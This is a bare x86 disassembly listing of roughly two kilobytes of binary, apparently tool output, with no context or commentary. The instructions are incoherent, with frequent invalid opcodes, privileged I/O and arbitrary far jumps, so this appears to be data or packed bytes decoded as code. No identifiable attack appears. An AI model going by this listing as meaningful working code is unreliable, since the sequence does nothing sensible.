  414efb:	sbb    DWORD PTR [eax-0x2b908329],edi
  414f01:	jno    0x414f33
  414f03:	(bad)  
  414f04:	mov    esi,0xf92e0a6f
  414f09:	or     bl,al
  414f0b:	lods   eax,DWORD PTR ds:[esi]
  414f0c:	pop    esi
  414f0d:	sub    al,0xbd
  414f0f:	out    dx,al
  414f10:	sbb    al,0x9
  414f12:	pop    eax
  414f13:	mov    bl,0xd
  414f15:	push   edx
  414f16:	jp     0x19ba782e
  414f1c:	(bad)  
  414f1e:	push   ds
  414f1f:	std    
  414f20:	mov    bh,0xb1
  414f22:	mov    edi,ebx
  414f24:	cmp    DWORD PTR [esi-0x450b760a],0xffffff9a
  414f2b:	cmp    BYTE PTR [edi],0xb
  414f2e:	push   cs
  414f2f:	sub    BYTE PTR [esp+edx*8],ah
  414f32:	(bad)  
  414f33:	mov    dh,0xdd
  414f35:	adc    edx,DWORD PTR [ebp+eiz*1-0x5e]
  414f39:	test   al,0xfe
  414f3b:	fs js  0x414f73
  414f3e:	ss out dx,al
  414f40:	xchg   esp,eax
  414f41:	data16 cmp BYTE PTR [ecx+0x1a],0x14
  414f46:	mov    esi,0xfb945b75
  414f4b:	dec    eax
  414f4c:	ja     0x414ed9
  414f4e:	inc    ebp
  414f4f:	int3   
  414f50:	gs iret 
  414f52:	lahf   
  414f53:	jmp    0x5c714457
  414f58:	jo     0x414f03
  414f5a:	enter  0x7b6f,0x69
  414f5e:	jge    0x414f2e
  414f60:	enter  0x5712,0x50
  414f64:	mov    eax,0x17fa380e
  414f69:	add    ecx,ecx
  414f6b:	data16 jne 0x414fda
  414f6e:	mov    ecx,0x8d34fd0
  414f73:	xor    dh,al
  414f75:	add    edi,DWORD PTR [esi+edx*8+0xb42bfe0]
  414f7c:	push   ds
  414f7d:	mov    edx,0x9b271f70
  414f82:	push   edx
  414f83:	and    DWORD PTR [ebx-0x80],ebx
  414f86:	push   edi
  414f87:	push   ds
  414f88:	sti    
  414f89:	shr    DWORD PTR [ebp+esi*2+0x2bb6cb49],cl
  414f90:	add    BYTE PTR [edi],0x84
  414f93:	inc    ebp
  414f94:	inc    ebp
  414f95:	out    0x3b,eax
  414f97:	jns    0x414fbf
  414f99:	(bad)  
  414f9a:	int    0x66
  414f9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f9d:	jl     0x414fcd
  414f9f:	sbb    esp,DWORD PTR [edi-0x1a]
  414fa2:	sub    eax,0x1ce8a6e6
  414fa7:	xchg   edx,eax
  414fa8:	mov    ds:0xc1e805cd,al
  414fae:	mul    dh
  414fb0:	fwait
  414fb1:	(bad)  
  414fb2:	bound  eax,QWORD PTR [eax*1-0x306fece9]
  414fb9:	test   al,0x93
  414fbb:	jo     0x414f99
  414fbd:	pop    ebx
  414fbe:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414fc0:	jecxz  0x414f81
  414fc2:	jmp    0x41503d
  414fc4:	inc    ebp
  414fc5:	pushf  
  414fc6:	push   esp
  414fc7:	pop    ds
  414fc8:	lods   al,BYTE PTR ds:[esi]
  414fc9:	lods   al,BYTE PTR ds:[esi]
  414fca:	sub    esp,DWORD PTR [ecx-0x1354130b]
  414fd0:	or     BYTE PTR [ebx+eax*8-0x9],ah
  414fd4:	cdq    
  414fd5:	je     0x415053
  414fd7:	mov    ecx,gs
  414fd9:	pop    ebp
  414fda:	mov    edi,0x3e54ae41
  414fdf:	ja     0x414fdf
  414fe1:	dec    esi
  414fe2:	jo     0x41505a
  414fe4:	imul   ecx,esp,0x79
  414fe7:	mov    WORD PTR [eax-0x2],?
  414fea:	(bad)  
  414feb:	js     0x414fa6
  414fed:	(bad)  
  414fee:	mov    ebp,0xbacafdb8
  414ff3:	pop    ds
  414ff4:	in     eax,dx
  414ff5:	leave  
  414ff6:	push   ebx
  414ff7:	cli    
  414ff8:	jle    0x414ffd
  414ffa:	call   0x69bdc6e7
  414fff:	mov    bh,0xdf
  415001:	cmova  ebp,DWORD PTR [edx]
  415004:	sub    bh,al
  415006:	(bad)  
  415007:	pop    ds
  415008:	bound  esi,QWORD PTR ds:0x2630545d
  41500e:	fsubr  DWORD PTR [edx+0x5355bbd5]
  415014:	pop    ebp
  415015:	repnz sub bl,BYTE PTR [eax+0x2]
  415019:	push   edx
  41501a:	repz mov ?,WORD PTR [ebx+eiz*2+0x1c4a6b81]
  415022:	or     eax,0x1d0e18dc
  415027:	xchg   ecx,eax
  415028:	fwait
  415029:	adc    al,BYTE PTR [edx+0x16]
  41502c:	test   al,0x3b
  41502e:	push   esp
  41502f:	rcl    DWORD PTR [eax-0x371e2609],0x5f
  415036:	adc    DWORD PTR [edi+edx*8-0x1d],esi
  41503a:	adc    al,0x94
  41503c:	add    ah,BYTE PTR [eax+0x65d7c81]
  415042:	pushf  
  415043:	inc    esp
  415044:	cmp    eax,0xa7d24c42
  415049:	imul   ebp,edi,0x67
  41504c:	out    dx,eax
  41504d:	push   edi
  41504e:	into   
  41504f:	gs pop ebp
  415051:	std    
  415052:	xchg   ebx,eax
  415053:	mov    dx,0x24c2
  415057:	xor    ecx,ebx
  415059:	pop    esp
  41505a:	inc    edx
  41505b:	jmp    0x2aec:0x3ad9fa53
  415062:	dec    ecx
  415063:	xchg   edi,eax
  415064:	inc    edx
  415065:	lds    ebx,FWORD PTR ds:0xdb1f6fa1
  41506b:	mov    al,ds:0x6b862eff
  415070:	nop
  415071:	fcmovu st,st(7)
  415073:	sub    al,dh
  415075:	inc    eax
  415076:	sbb    DWORD PTR [esi+esi*8-0x31cda041],0x4a
  41507e:	sub    edi,ebx
  415080:	or     edi,ecx
  415082:	jl     0x4150f2
  415084:	js     0x41502a
  415086:	scas   eax,DWORD PTR es:[edi]
  415087:	jae    0x41508d
  415089:	xlat   BYTE PTR ds:[ebx]
  41508a:	scas   eax,DWORD PTR es:[edi]
  41508b:	fisubr WORD PTR [eax-0x6d7e2436]
  415091:	fadd   QWORD PTR [esi+0x47681862]
  415097:	retf   
  415098:	mov    ebp,0x55b1be51
  41509d:	xchg   esp,eax
  41509e:	and    al,al
  4150a0:	in     al,dx
  4150a1:	mov    dh,0x47
  4150a3:	cmp    DWORD PTR [esi-0x557a240d],0xc2b55e88
  4150ad:	jo     0x4150c2
  4150af:	or     eax,0x4fc26e17
  4150b4:	call   0x3e87:0x44096a
  4150bb:	xchg   ebp,ebp
  4150bd:	std    
  4150be:	out    dx,eax
  4150bf:	pop    eax
  4150c0:	stc    
  4150c1:	and    eax,0xcb894506
  4150c6:	imul   ebp,DWORD PTR [edi],0x65c85a28
  4150cc:	in     al,dx
  4150cd:	cmp    al,0x92
  4150cf:	test   ah,bl
  4150d1:	mov    ds:0xe41fc11a,al
  4150d6:	out    dx,al
  4150d7:	jns    0x4150d9
  4150d9:	ins    DWORD PTR es:[edi],dx
  4150da:	mov    ah,0x4d
  4150dc:	and    ch,BYTE PTR [esi+0x95c1260]
  4150e2:	mov    DWORD PTR [esi],ebp
  4150e4:	loopne 0x4150c3
  4150e6:	cli    
  4150e7:	dec    ebp
  4150e8:	sub    eax,0x98058b35
  4150ee:	outs   dx,DWORD PTR cs:[esi]
  4150f0:	fdiv   QWORD PTR [edx+ecx*2]
  4150f3:	nop
  4150f4:	in     eax,0xa1
  4150f6:	push   ecx
  4150f7:	fisttp WORD PTR [edx+0x752aa3b]
  4150fd:	xor    dh,BYTE PTR [ecx]
  4150ff:	icebp  
  415100:	sub    edi,DWORD PTR [eax]
  415102:	add    esp,DWORD PTR [edx-0x7dc336e7]
  415108:	mov    ds:0xc67963f4,eax
  41510d:	mov    ebp,0x6fbb0aee
  415112:	in     eax,dx
  415113:	jmp    0xe49fe8e4
  415118:	xor    BYTE PTR [eax],bh
  41511a:	and    al,0xba
  41511c:	das    
  41511d:	sbb    BYTE PTR [ebx+eiz*4+0x278a8a93],dh
  415124:	xor    ch,BYTE PTR [ebp-0x28]
  415127:	hlt    
  415128:	push   ebp
  415129:	call   0x19f14642
  41512e:	iret   
  41512f:	xor    DWORD PTR [edi-0x2],esi
  415132:	in     eax,dx
  415133:	fs mov dl,ah
  415136:	outs   dx,BYTE PTR ds:[esi]
  415137:	inc    ebx
  415138:	cmp    edi,esp
  41513a:	fild   QWORD PTR [ecx+0x79]
  41513d:	pop    edi
  41513e:	aad    0x88
  415140:	sahf   
  415141:	(bad)  
  415142:	std    
  415143:	mov    edi,DWORD PTR [ebx]
  415145:	frstor [eax+0x304fe57b]
  41514b:	xor    ecx,DWORD PTR ds:0xdc22da65
  415151:	add    ah,BYTE PTR [esi]
  415153:	ds rcl bl,0x93
  415157:	mov    al,ds:0xf7e0f37c
  41515c:	fs aas 
  41515e:	fadd   DWORD PTR [edi+0x60bd81ad]
  415164:	adc    al,0xe4
  415166:	push   ss
  415167:	mov    ebx,0x46f34753
  41516c:	lahf   
  41516d:	mov    edx,0x97df6df
  415172:	pushf  
  415173:	mov    edi,0x9a0abd6f
  415178:	int    0xe1
  41517a:	mov    BYTE PTR [ebp+ebp*2+0x51],0xce
  41517f:	xchg   ebp,eax
  415180:	je     0x4151d3
  415182:	popa   
  415183:	je     0x41516d
  415185:	add    ecx,DWORD PTR [edi]
  415187:	cmp    eax,0xa7a7c203
  41518c:	xor    edx,DWORD PTR [ebp+0x75]
  41518f:	fmul   QWORD PTR [ebx-0x7c]
  415192:	pop    ss
  415193:	mov    esp,0x958f806c
  415198:	aad    0xf2
  41519a:	jp     0x4151d8
  41519c:	inc    edi
  41519d:	in     eax,dx
  41519e:	sub    eax,0x678a4cd8
  4151a3:	dec    ebx
  4151a4:	jne    0x41519a
  4151a6:	or     esp,DWORD PTR [ecx+0x74e18ee7]
  4151ac:	push   ecx
  4151ad:	add    ebp,DWORD PTR [ebp-0x59990dc2]
  4151b3:	pop    es
  4151b4:	cdq    
  4151b5:	pop    edx
  4151b6:	lods   eax,DWORD PTR ds:[esi]
  4151b7:	std    
  4151b8:	outs   dx,BYTE PTR ds:[esi]
  4151b9:	ret    
  4151ba:	fstp   QWORD PTR [esi+esi*1]
  4151bd:	lock hlt 
  4151bf:	les    ebp,FWORD PTR [ecx+ebx*2]
  4151c2:	jbe    0x415193
  4151c4:	push   eax
  4151c5:	loope  0x415162
  4151c7:	popf   
  4151c8:	cdq    
  4151c9:	out    dx,eax
  4151ca:	shl    BYTE PTR [ebx],1
  4151cc:	push   eax
  4151cd:	lea    edi,[ebx+0x32d8e8ef]
  4151d3:	or     eax,DWORD PTR [ecx+0x2]
  4151d6:	xor    bh,BYTE PTR [ebx]
  4151d8:	fld    st(6)
  4151da:	jo     0x4151e6
  4151dc:	loop   0x4151d2
  4151de:	popf   
  4151df:	inc    DWORD PTR [esi-0x6f]
  4151e2:	and    DWORD PTR [ebx+0x7a52701c],ebp
  4151e8:	dec    edi
  4151e9:	sar    ah,1
  4151eb:	mov    eax,esi
  4151ed:	jg     0x415182
  4151ef:	jnp    0x41526d
  4151f1:	dec    ebx
  4151f2:	scas   al,BYTE PTR es:[edi]
  4151f3:	push   edi
  4151f4:	fcom   QWORD PTR [ebp-0x12446da6]
  4151fa:	rcl    DWORD PTR [esi],1
  4151fc:	lahf   
  4151fd:	jne    0x415226
  4151ff:	div    DWORD PTR [eiz*4+0x5d1ef721]
  415206:	mov    esp,0xae4e3c3c
  41520b:	ins    DWORD PTR es:[edi],dx
  41520c:	xlat   BYTE PTR ds:[ebx]
  41520d:	ins    BYTE PTR es:[edi],dx
  41520e:	outs   dx,DWORD PTR ds:[esi]
  41520f:	or     DWORD PTR [esp+0x14],eax
  415213:	adc    DWORD PTR [edx],edi
  415215:	sbb    al,0x34
  415217:	and    al,0x38
  415219:	push   ebp
  41521a:	cmp    al,0x82
  41521c:	mov    ecx,0x4b4c1450
  415221:	xchg   ebx,eax
  415222:	cmp    DWORD PTR ds:0xa3487703,ecx
  415228:	or     al,0x6d
  41522a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41522b:	jnp    0x4151e8
  41522d:	jg     0x4151be
  41522f:	or     DWORD PTR ss:[edi-0x5f],0x46
  415234:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415235:	xchg   edx,eax
  415236:	and    ah,BYTE PTR [eax+esi*8-0x45]
  41523a:	xchg   edx,eax
  41523b:	and    eax,0xeb705e8a
  415240:	out    dx,eax
  415241:	aam    0x12
  415243:	gs fwait
  415245:	jae    0x4152c1
  415247:	or     ecx,edi
  415249:	jmp    FWORD PTR [edx+0x48e5fe4c]
  41524f:	jecxz  0x41520d
  415251:	and    bh,0x47
  415254:	daa    
  415255:	xor    eax,0x50858383
  41525a:	jmp    0x415290
  41525c:	or     al,0x27
  41525e:	retf   0x71dd
  415261:	nop
  415262:	push   es
  415263:	or     ah,al
  415265:	bnd js 0x415228
  415268:	adc    al,dh
  41526a:	push   ebx
  41526b:	sub    edx,esp
  41526d:	fnstcw WORD PTR [ebp-0x7d]
  415270:	lock mov eax,ds:0x6f6f1bfa
  415276:	xchg   DWORD PTR [eax-0x1c],edi
  415279:	push   esi
  41527a:	test   BYTE PTR [edx],ah
  41527c:	out    dx,al
  41527d:	fdivr  QWORD PTR [edx-0x63d9deb4]
  415283:	sub    BYTE PTR ds:0x5c9d53d7,bh
  415289:	xor    DWORD PTR [ecx+0x104cb4d8],esp
  41528f:	leave  
  415290:	stos   DWORD PTR es:[edi],eax
  415291:	adc    DWORD PTR [eax+0x72aa3335],0xffffffd7
  415298:	ja     0x41525b
  41529a:	mov    edi,0x59c598ef
  41529f:	push   esi
  4152a0:	loopne 0x4152ae
  4152a2:	xor    ch,bh
  4152a4:	push   0x7782be8
  4152a9:	(bad)  
  4152aa:	lods   eax,DWORD PTR ds:[esi]
  4152ab:	fnsave [ecx-0x59]
  4152ae:	leave  
  4152af:	sbb    DWORD PTR [ebp-0x2a],edi
  4152b2:	mov    bh,0x37
  4152b4:	push   es
  4152b5:	sub    BYTE PTR [ebp+edi*4-0x6f870539],bh
  4152bc:	or     ah,BYTE PTR [esi-0x6ef3014e]
  4152c2:	adc    edx,DWORD PTR [esi-0x20b5b055]
  4152c8:	bndldx (bad),[edx-0x535f576a]
  4152cf:	cwde   
  4152d0:	into   
  4152d1:	cmp    eax,0x72712588
  4152d6:	xor    BYTE PTR [edx-0x3eb7037b],ch
  4152dc:	idiv   BYTE PTR [ebx-0x2]
  4152df:	data16 cld 
  4152e1:	fldcw  WORD PTR [esi+edi*8]
  4152e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152e5:	pop    ss
  4152e6:	mov    ds:0x4ea6da59,al
  4152eb:	inc    ebp
  4152ec:	lea    ecx,[esi+ecx*4]
  4152ef:	add    al,0xaa
  4152f1:	(bad)  
  4152f2:	cli    
  4152f3:	mov    eax,ds:0xad34fe7b
  4152f8:	pop    edi
  4152f9:	popf   
  4152fa:	inc    ecx
  4152fb:	mov    ds:0x8492a32d,eax
  415300:	ja     0x415360
  415302:	pop    edx
  415303:	popa   
  415304:	sbb    al,0x5c
  415306:	push   es
  415307:	mov    ah,0x58
  415309:	in     al,0x55
  41530b:	leave  
  41530c:	imul   esp,DWORD PTR [ebp+0xc],0xffffffa1
  415310:	dec    ecx
  415311:	xor    al,0xb2
  415313:	mov    ebx,fs
  415315:	jbe    0x41531c
  415317:	mov    al,fs:0x952d9e87
  41531d:	inc    esp
  41531e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41531f:	or     ebp,0x6b
  415322:	sub    al,0x4
  415324:	imul   ebx,DWORD PTR [ecx],0x1290ebed
  41532a:	or     ch,BYTE PTR [eax+0x3b]
  41532d:	in     eax,0x3f
  41532f:	or     bh,BYTE PTR [edi+0x41]
  415332:	test   edx,edx
  415334:	cmp    al,dh
  415336:	dec    esi
  415337:	ins    DWORD PTR es:[edi],dx
  415338:	aad    0x4a
  41533a:	sahf   
  41533b:	sbb    dh,BYTE PTR [edx]
  41533d:	outs   dx,BYTE PTR ds:[esi]
  41533e:	cmp    DWORD PTR [edx-0x405cf782],0x7b896331
  415348:	fsub   QWORD PTR [ecx+0x2e]
  41534b:	jl     0x415302
  41534d:	mov    dl,0x77
  41534f:	mov    ebp,0x49784c6d
  415354:	jmp    0xa6058fad
  415359:	arpl   sp,cx
  41535b:	lock outs dx,DWORD PTR ds:[esi]
  41535d:	push   ds
  41535e:	sbb    ecx,DWORD PTR [esi+0x78]
  415361:	leave  
  415362:	loope  0x415390
  415364:	jl     0x4152f8
  415366:	jg     0x4153a3
  415368:	stc    
  415369:	hlt    
  41536a:	lods   eax,DWORD PTR ds:[esi]
  41536b:	mov    al,ds:0x8f718161
  415370:	inc    ebp
  415371:	lahf   
  415372:	adc    al,0x68
  415374:	push   0xffffffa9
  415376:	shl    BYTE PTR [esi-0xe4c0eb8],cl
  41537c:	stos   BYTE PTR es:[edi],al
  41537d:	xor    al,0x13
  41537f:	add    DWORD PTR [ebx-0x16],0x3f
  415383:	fcomp  QWORD PTR [edx+0x2e640d29]
  415389:	mov    dl,0xef
  41538b:	(bad)  
  41538c:	call   0x434d2e94
  415391:	and    al,0x22
  415393:	shr    al,0xae
  415396:	jp     0x415396
  415398:	out    0x10,al
  41539a:	pop    edx
  41539b:	or     DWORD PTR [esi-0x29f2a0a5],ebx
  4153a1:	cmp    BYTE PTR [edx-0x31],bl
  4153a4:	sbb    eax,DWORD PTR [edi-0x6ac0d252]
  4153aa:	jne    0x4153a4
  4153ac:	xlat   BYTE PTR ds:[ebx]
  4153ad:	add    eax,0x2ea7072d
  4153b2:	bound  esp,QWORD PTR [ebx]
  4153b4:	mov    bh,0x14
  4153b6:	int3   
  4153b7:	in     al,0x48
  4153b9:	ret    
  4153ba:	inc    edx
  4153bb:	dec    edx
  4153bc:	rcr    DWORD PTR [esi-0x3acdb4aa],0xca
  4153c3:	stos   DWORD PTR es:[edi],eax
  4153c4:	and    edi,ecx
  4153c6:	fdiv   st,st(1)
  4153c8:	dec    edi
  4153c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153ca:	jg     0x4153fa
  4153cc:	enter  0x6a6c,0x14
  4153d0:	aaa    
  4153d1:	and    BYTE PTR [ecx],dh
  4153d3:	jno    0x415412
  4153d5:	fistp  WORD PTR [ebp+0x2]
  4153d8:	cmp    cl,BYTE PTR [esi]
  4153da:	repnz scas eax,DWORD PTR es:[edi]
  4153dc:	sub    esi,DWORD PTR [edx]
  4153de:	loopne 0x415410
  4153e0:	sbb    DWORD PTR [ebp-0x4029e1ec],ebx
  4153e6:	push   es
  4153e7:	cmp    ecx,DWORD PTR [ecx-0x1874343b]
  4153ed:	sahf   
  4153ee:	and    DWORD PTR [eax+0x65b2ec7f],ebx
  4153f4:	in     al,dx
  4153f5:	pop    ds
  4153f6:	mov    bh,0xff
  4153f8:	dec    esi
  4153f9:	jae    0x4153cd
  4153fb:	xor    BYTE PTR [esi+0x295b9993],dl
  415401:	(bad)  
  415402:	(bad)  
  415403:	fdivr  DWORD PTR ds:0x4bf3759d
  415409:	dec    esi
  41540a:	shl    BYTE PTR [eax+0x1e79024],1
  415410:	loop   0x415409
  415412:	mov    ?,WORD PTR [esi+0x38]
  415415:	sub    ecx,DWORD PTR [esi-0x29]
  415418:	sti    
  415419:	adc    bh,BYTE PTR [ecx]
  41541b:	sbb    al,0xee
  41541d:	dec    edi
  41541e:	mov    ebp,DWORD PTR [edi]
  415420:	clc    
  415421:	fwait
  415422:	mov    ecx,0x385d50ef
  415427:	(bad)  
  415428:	sub    DWORD PTR [ebp+0x3e9cc9cb],esp
  41542e:	(bad)  
  41542f:	lahf   
  415430:	call   FWORD PTR [ebp-0x33]
  415433:	mov    edx,0x4da437b6
  415438:	inc    edi
  415439:	popa   
  41543a:	mov    eax,ds:0x6d8ab36
  41543f:	imul   esp,DWORD PTR [esi-0x1b],0xb95642dd
  415446:	pop    ecx
  415447:	out    0xd,eax
  415449:	test   eax,0xc72fd603
  41544e:	mov    esi,0xd6a7439a
  415453:	xchg   esi,eax
  415454:	xor    bh,dl
  415456:	inc    esi
  415457:	sbb    BYTE PTR [ebp+0x37b8d6c],cl
  41545d:	jmp    0x357c:0x8e865d6b
  415464:	jnp    0x4154cf
  415466:	mov    BYTE PTR [eax-0x67],dh
  415469:	jge    0x41549d
  41546b:	std    
  41546c:	fdivp  st(6),st
  41546e:	es mov cl,0x31
  415471:	cmc    
  415472:	mov    ch,0x7e
  415474:	pop    ds
  415475:	push   0xffffffe5
  415477:	push   0x6
  415479:	push   ebp
  41547a:	test   eax,0x9af91c93
  41547f:	pop    ss
  415480:	cmp    BYTE PTR [edx+ecx*4-0x7cbb6df2],ah
  415487:	int3   
  415488:	jb     0x41549f
  41548a:	leave  
  41548b:	fcmovnbe st,st(1)
  41548d:	sub    eax,0xd0d61a95
  415492:	loopne 0x4154c1
  415494:	mov    esp,0x38b766dc
  415499:	leave  
  41549a:	es xchg ebp,eax
  41549c:	out    0x65,eax
  41549e:	cld    
  41549f:	mov    ebx,0xe6c659f2
  4154a4:	mov    ecx,0x3019de67
  4154a9:	add    DWORD PTR [ebx],ebx
  4154ab:	push   ebx
  4154ac:	pop    ss
  4154ad:	jae    0x4154e9
  4154af:	jbe    0x4154f7
  4154b1:	repnz mov ecx,DWORD PTR [edx-0x1f4a00a0]
  4154b8:	repz sti 
  4154ba:	aaa    
  4154bb:	dec    ebx
  4154bc:	popf   
  4154bd:	dec    edx
  4154be:	push   ecx
  4154bf:	sbb    eax,0xef4a4b8f
  4154c4:	xor    BYTE PTR [ecx-0x2d1d4e9d],bh
  4154ca:	jae    0x4154a5
  4154cc:	pop    ss
  4154cd:	(bad)  
  4154ce:	xchg   ebx,eax
  4154cf:	pop    es
  4154d0:	int3   
  4154d1:	stc    
  4154d2:	(bad)  [ebp-0x38a6a6c0]
  4154d8:	rol    ecx,0xd2
  4154db:	aam    0x60
  4154dd:	jg     0x4154ab
  4154df:	sahf   
  4154e0:	or     DWORD PTR fs:[ecx],esp
  4154e3:	adc    al,0x6e
  4154e5:	out    dx,al
  4154e6:	rcr    ecx,1
  4154e8:	and    bl,ch
  4154ea:	sub    ecx,DWORD PTR [eax-0x485cbac1]
  4154f0:	sysret 
  4154f2:	and    dl,BYTE PTR [esi+edi*2]
  4154f5:	fcom   QWORD PTR [esp+eax*4-0x41]
  4154f9:	jbe    0x415515
  4154fb:	mov    ebp,DWORD PTR [ebx+0x4e9f4247]
  415501:	xchg   esp,eax
  415502:	ss jmp 0x37df:0xe921047e
  41550a:	mov    ebp,0xa6f824eb
  41550f:	lea    ebp,[edi-0x5b314519]
  415515:	sub    BYTE PTR [ebx+0x3b],ch
  415518:	leave  
  415519:	adc    DWORD PTR [ecx-0x6d],ebx
  41551c:	stos   DWORD PTR es:[edi],eax
  41551d:	pop    edi
  41551e:	mov    edx,0x148a12e0
  415523:	adc    BYTE PTR [ecx+0x6f333a9b],0xd
  41552a:	xchg   edx,eax
  41552b:	ja     0x4154e6
  41552d:	sub    DWORD PTR [eax-0x7d5dd401],ebx
  415533:	mov    esp,0xca79b06c
  415538:	cdq    
  415539:	push   es
  41553a:	xor    BYTE PTR [ecx-0x21dc7db1],cl
  415540:	pop    es
  415541:	add    ecx,esi
  415543:	jmp    0x415513
  415545:	(bad)  
  415546:	push   edi
  415547:	hlt    
  415548:	jae    0x4154fb
  41554a:	out    dx,al
  41554b:	fwait
  41554c:	xchg   edi,eax
  41554d:	bnd call 0x389de6b3
  415553:	addr16 xor ch,bl
  415556:	or     eax,0x2f1f648a
  41555b:	xchg   ah,dh
  41555d:	jl     0x4154ec
  41555f:	out    0xbf,al
  415561:	sahf   
  415562:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415563:	rol    DWORD PTR [edi+0x54c9fcc5],1
  415569:	mov    eax,0x2229900b
  41556e:	mov    WORD PTR [edx+0x1ceeb9bf],fs
  415574:	pop    es
  415575:	mov    ah,0xb6
  415577:	add    BYTE PTR [edi+0x348ae47b],bl
  41557d:	xchg   ebx,eax
  41557e:	or     dh,ch
  415580:	(bad)  
  415581:	lock push esp
  415583:	sub    DWORD PTR [ecx-0x58863500],0xffffffeb
  41558a:	mov    ds:0x518ca68b,eax
  41558f:	pop    ebp
  415590:	sbb    al,0xe0
  415592:	rcr    DWORD PTR [edi],0x1e
  415595:	rcr    esi,0x9a
  415598:	fidiv  DWORD PTR [eax-0x263ac651]
  41559e:	or     al,0xd7
  4155a0:	ss not DWORD PTR es:[edx-0x69c7acb]
  4155a8:	(bad)  
  4155a9:	mov    ebx,0xf873fd79
  4155ae:	(bad)  
  4155af:	mov    esi,0x61f61cd6
  4155b4:	dec    esp
  4155b5:	lds    ebx,FWORD PTR [esi-0x12]
  4155b8:	pop    ecx
  4155b9:	aad    0x24
  4155bb:	aad    0x25
  4155bd:	outs   dx,DWORD PTR ds:[esi]
  4155be:	shr    BYTE PTR [edi],cl
  4155c0:	sbb    eax,0xbc27d766
  4155c5:	jbe    0x41557e
  4155c7:	xor    al,0x19
  4155c9:	xor    bh,BYTE PTR [ebp+0x61]
  4155cc:	fadd   DWORD PTR [ebx+esi*4]
  4155cf:	sub    ecx,DWORD PTR [edx-0x6954c7fa]
  4155d5:	into   
  4155d6:	fs icebp 
  4155d8:	jecxz  0x415628
  4155da:	dec    ecx
  4155db:	pop    es
  4155dc:	retf   
  4155dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155de:	cli    
  4155df:	or     DWORD PTR [esi-0x5d97846d],edx
  4155e5:	into   
  4155e6:	jne    0x415577
  4155e8:	in     eax,0x43
  4155ea:	mov    ebx,0x3ba8ee74
  4155ef:	xchg   ecx,eax
  4155f0:	pop    ds
  4155f1:	test   al,0x33
  4155f3:	xor    al,BYTE PTR [ecx+0x30eee328]
  4155f9:	ins    DWORD PTR es:[edi],dx
  4155fa:	xchg   ebx,eax
  4155fb:	sub    DWORD PTR [edx-0x1af09a67],0xbf7eb6cd
  415605:	jns    0x41562d
  415607:	inc    esi
  415608:	iret   
  415609:	dec    di
  41560b:	icebp  
  41560c:	mov    cl,0xee
  41560e:	frstor [ebp+0x79]
  415611:	sar    BYTE PTR [eax+0x69],cl
  415614:	icebp  
  415615:	add    esi,DWORD PTR [edi-0x14]
  415618:	inc    ecx
  415619:	mov    BYTE PTR [ebx-0x5c],ch
  41561c:	pop    ss
  41561d:	es int3 
  41561f:	(bad)  
  415620:	(bad)  
  415621:	sti    
  415622:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415623:	test   DWORD PTR [edx],esp
  415625:	ret    
  415626:	(bad)  
  415627:	cld    
  415628:	xchg   DWORD PTR [edx-0x23],esi
  41562b:	fild   QWORD PTR [esi-0x40]
  41562e:	les    edx,FWORD PTR [edx]
  415630:	push   cs
  415631:	sbb    BYTE PTR [edx],0xc7
  415634:	and    al,0xd3
  415636:	mov    cl,0x8b
  415638:	sbb    al,0xef
  41563a:	pop    ebx
  41563b:	aas    
  41563c:	stc    
  41563d:	or     esp,DWORD PTR [esi+0x1f21bd88]
  415643:	inc    ebp
  415644:	cmp    cl,BYTE PTR [ebx+0x42ef789b]
  41564a:	or     eax,0x55cf753b
  41564f:	push   esi
  415650:	dec    esi
  415651:	jl     0x4156c2
  415653:	ret    0xab62
  415656:	pop    eax
  415657:	clc    
  415658:	in     eax,0x7c
  41565a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41565b:	aad    0xc1
  41565d:	frstor [ebp-0x45]
  415660:	shr    DWORD PTR [esi+0x50af7e1c],1
  415666:	sub    dh,BYTE PTR [edx-0x37]
  415669:	imul   dh
  41566b:	mov    esp,0xf4915082
  415670:	jg     0x415618
  415672:	push   ebp
  415673:	mov    dl,0xa9
  415675:	retf   
  415676:	pop    esp
  415677:	daa    
  415678:	loopne 0x415663
  41567a:	aam    0xb0
  41567c:	dec    edx
  41567d:	retf   
  41567e:	inc    ecx
  41567f:	lds    ebp,FWORD PTR ds:0xd04a9a18
  415685:	retf   0xa599
  415688:	cmp    ebp,DWORD PTR [ecx]
  41568a:	lahf   
  41568b:	ins    DWORD PTR es:[edi],dx
  41568c:	and    BYTE PTR [edx+0x46914f3b],0x7c
  415693:	xchg   BYTE PTR [edx-0x1d],ch
  415696:	push   esp
  415697:	(bad)  
  415699:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41569a:	call   0x84f0:0x9b4f776f
  4156a1:	and    eax,0x18291d37
  4156a6:	jae    0x4156cd
  4156a8:	outs   dx,DWORD PTR ds:[esi]
  4156a9:	int    0xa3
  4156ab:	test   DWORD PTR [edi+esi*2-0x188df475],ebx
  4156b2:	mov    esp,0xc732a471
  4156b7:	pushf  
  4156b8:	loop   0x415708
  4156ba:	dec    ebp
  4156bb:	arpl   WORD PTR [ebx+0x40c44f5d],bp
  4156c1:	or     esp,DWORD PTR [ebx+ebx*4]
  4156c4:	cmp    eax,DWORD PTR ds:0xe5ff4969
  4156ca:	aam    0xb0
  4156cc:	mov    ds:0xdd277ea7,al
  4156d1:	out    0xba,eax
  4156d3:	jae    0x41567e
  4156d5:	loop   0x415742
  4156d7:	and    BYTE PTR [esi-0x472c61a],bl
  4156dd:	mov    dh,0xbc
  4156df:	in     al,dx
  4156e0:	ss sar eax,0x72
  4156e4:	mov    cl,0xb6
  4156e6:	ds jnp 0x4156c0
  4156e9:	dec    ecx
  4156ea:	push   ds
  4156eb:	mov    bh,0x4b
  4156ed:	dec    esp
  4156ee:	out    0x75,eax
  4156f0:	mov    dh,0x56
  4156f2:	inc    ebp
  4156f3:	sub    BYTE PTR [esp+eax*4+0x44],ch
  4156f7:	inc    esi
  4156f8:	call   0x2bed:0xd00ea83a
  4156ff:	test   DWORD PTR [esi-0x67659f12],edx
